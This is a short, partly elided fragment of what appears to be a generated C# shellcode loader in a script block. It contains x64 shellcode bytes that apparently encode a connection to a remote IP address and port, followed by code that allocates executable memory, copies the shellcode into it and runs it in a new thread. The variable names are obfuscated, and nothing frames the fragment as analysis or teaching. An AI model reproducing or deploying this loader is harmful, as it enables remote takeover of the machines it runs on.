...
0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x04,0xd2,0x0a,0x04,0x1c,0x84,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,
...
0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5 };
        ...
        IntPtr n9awnTrPJ = VirtualAlloc(IntPtr.Zero,(UIntPtr)lpGue85UUCW.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(lpGue85UUCW,0,n9awnTrPJ,lpGue85UUCW.Length);
        IntPtr y2Kt2e = IntPtr.Zero;
        IntPtr sTr4XUHCq4 = CreateThread(IntPtr.Zero,UIntPtr.Zero,n9awnTrPJ,IntPtr.Zero,0,ref y2Kt2e);
    }
</script>
